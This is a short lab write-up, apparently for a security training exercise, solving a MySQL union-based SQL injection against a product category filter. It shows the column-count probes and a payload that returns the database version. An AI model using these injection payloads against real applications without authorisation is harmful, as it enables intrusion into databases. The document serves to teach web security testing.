# Lab 03 :  SQL injection attack, querying the database type and version on MySQL and Microsoft

## Overview:
- Level : PRACTITIONER
- SQL Injection on product category filter
- Union attack
- End Goal : Display the database version string



## Analysis:
- Make the database retrieve the string: '8.0.36-0ubuntu0.20.04.1'
- put ' as product category it give 500 internal server error

## Solution:
- determine number of column
    ' UNION SELECT 'def',# gives 500 internal server error
    ' UNION SELECT 'def','adfs'# gives 200 ok responce
    so there are two column

- to get database type and version use following payload
    ' UNION SELECT @@version, NULL#


